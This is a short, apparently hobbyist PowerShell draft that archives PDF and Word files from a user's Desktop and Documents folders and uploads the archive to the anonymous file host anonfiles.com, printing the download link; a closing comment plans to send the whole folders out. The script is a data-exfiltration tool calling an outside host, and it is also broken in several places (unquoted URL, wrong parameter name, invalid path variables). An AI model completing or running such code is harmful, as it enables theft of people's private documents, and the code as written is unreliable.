#the following is a idea a got while sitting in a cafe. at the end it should upload a file to anonfiles.com and echo the url to access it.
$datapath1 = "%temp%\testforapi\test"
$input1 = "%User%\Desktop\*.pdf,*.docx"
$input2 = "%User%\Dokuments\*.pdf,*.docx"
Compress-Archive $input1 $datapath1
Compress-Archive $input2 -update $datapath1

$url = https://api.anonfiles.com/upload?token=6e578f0f3525bf07

$s = Invoke-WebRequest -url $url -Method Put -Infile $datapath1

print "$s.Content"
 
 #I still need some way to kompress the whole "Dokumekte" and "Desktop" folder so I can send them to anonfiles wich has a limitation of 3gb.